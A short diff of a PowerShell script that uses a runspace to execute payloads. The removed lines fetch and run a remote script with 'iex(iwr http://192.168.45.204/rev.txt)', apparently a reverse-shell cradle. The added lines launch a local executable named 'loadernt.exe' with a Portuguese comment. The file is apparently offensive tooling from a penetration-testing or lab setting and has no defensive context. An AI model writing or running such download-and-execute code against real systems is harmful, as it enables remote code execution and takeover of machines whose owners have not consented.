@@ -1,7 +1,10 @@
-$rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
+$rs = [Runspaces.RunspaceFactory]::CreateRunspace()
 $rs.Open()
-$pipe = $rs.CreatePipeline()
-$pipe.Commands.AddScript("iex(iwr http://192.168.45.204/rev.txt -UseBasicParsing)")
-$pipe.Commands.Add("Out-String")
-$pipe.Invoke() | Out-String
+$ps = [PowerShell]::Create()
+$ps.Runspace = $rs
+
+# O comando para executar o seu .exe
+$ps.AddScript("Start-Process -FilePath 'C:\setup\loadernt.exe' -NoNewWindow")
+
+$ps.Invoke()
 $rs.Close()
